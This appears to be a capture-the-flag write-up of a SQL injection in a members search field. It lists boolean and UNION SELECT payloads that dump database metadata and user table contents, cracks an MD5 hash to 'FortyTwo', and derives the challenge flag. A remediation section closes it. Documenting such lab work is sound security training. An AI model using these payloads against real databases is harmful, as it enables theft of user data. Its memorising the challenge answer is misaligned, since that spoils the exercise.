# SQL Injection On Members Search

## Breach
The members search field directly interpolates numeric input into a SQL query. Boolean and `UNION SELECT` payloads expose database metadata and user table contents.

## Proof
```sql
1 OR TRUE
-1 UNION SELECT database(), user()
-1 UNION SELECT table_name, column_name FROM information_schema.columns
-1 UNION SELECT concat(Commentaire, countersign), concat(user_id, first_name, last_name) FROM users
```

The dumped data contains MD5 `5ff9d0165b4f92b14994e5c685cdce28`, which resolves to `FortyTwo`. The challenge asks for SHA-256 of lowercase `fortytwo`:

```bash
printf fortytwo | sha256sum
```

## Fix
Use prepared statements, strict type validation, least-privilege database accounts, and generic error messages.

